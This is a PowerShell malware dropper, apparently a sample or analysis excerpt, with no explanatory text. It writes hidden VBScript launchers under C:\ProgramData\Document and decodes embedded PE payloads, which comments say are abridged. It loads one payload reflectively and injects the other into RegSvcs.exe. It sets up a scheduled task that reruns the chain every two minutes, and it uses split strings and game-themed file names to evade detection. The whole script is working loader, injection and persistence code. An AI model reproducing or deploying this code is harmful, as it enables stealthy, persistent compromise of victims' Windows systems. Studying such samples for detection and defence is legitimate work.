$a = "C:\Progra/mData\Do/cume/nt".Replace("/","")
New-Item $a -ItemType Directory -Force
Sleep 1
$Content = @'
on error resume next
Set objShell = CreateObject("Wscript.Shell")
objShell.Run("Powershell -ExecutionPolicy Bypass $a='ReadAllText';$T='C:\ProgramData\Document\Report.ps1';IEx([IO.File]::$a($T))"),0
'@
[IO.File]::WriteAllText("C:\ProgramData\Document\HotLine.vbs", $Content)
$Content = @'
on error resume next
Set objShell = CreateObject("Wscript.Shell")
objShell.Run("Powershell -ExecutionPolicy Bypass $a='ReadAllText';$T='C:\ProgramData\Document\Ubisoft64.ps1';IEx([IO.File]::$a($T))"),0
'@
[IO.File]::WriteAllText("C:\ProgramData\Document\Ubisoft64.vbs", $Content)
$Content = @'
Try{
function xxx {
param($app1)$app1 = $app1 -split '(..)' | ? { $_ }
ForEach ($UX2 in $app1)
{
[Convert]::ToInt32($UX2,16)
}
}
[byte[]] $apprun  = xxx('4D5A9----3-------4------FFFF----B8---...-------------------------'.Replace('-','0')) # NOTE: The actual 88064-character Base64 string omitted for readability.
}catch{}
Try{
[byte[]] $appme  = xxx ('4D5A9!!!!3!!!!!!!4...!!!!!!!!!!!!!!!!!!!!!!'.Replace('!','0').Replace('~','1')) # NOTE: The actual 92160-character Base64 string omitted for readability.
$T = 'Get'
$M = $T + 'Method'
$I = 'Invoke'
$T = $T + 'Type'
$L = 'Load'
$Q0 = [<#1#>Reflection.Assembly<#1#>]
$B = $Q0::$L($apprun)
$B = $B.$T('NewPE2.PE')
$B = $B.$M('Execute')
$Mn = 'C:\W'+'in'+'do'+'ws\Mic'
$Ub = $Mn + 'ro'+'s'+'oft.N'+'ET\Fr'
$z = $Ub + 'amew'+'ork\v4.0'
$VT = $z + '.30'+'319\'
$XQ = $VT + 'Re'+'gSv'+'cs.e'+'xe'
}catch{}
return $B = $B.$I($null,[object[]] ($XQ,$appme));
'@
[IO.File]::WriteAllText("C:\ProgramData\Document\Report.ps1", $Content)
function go {
param($Y6c)$Y6c = $Y6c -split '(..)' | ? { $_ }
ForEach ($chrome in $Y6c){[Convert]::ToInt32($chrome,16)}}
[byte[]] $bytes2  = go('7472792!!D!A7B!D!A26277363687461736B732E657865272!272F637265617465272!272F7363272!276D696E757465272!272F6D6F272!322!272F746E272!276D6D3634272!272F7472272!282827433A5C5!726F6772616D446174615C446F63756D656E745C486F744C696E652E7662732729293B!D!A!D!A7D2!63617463682!7B2!7D'.Replace('!','0'))
[io.file]::WriteAllBytes("C:\ProgramData\Document\Ubisoft64.ps1",$bytes2)
Start-Sleep 6
start "C:\ProgramData\Document\Ubisoft64.vbs"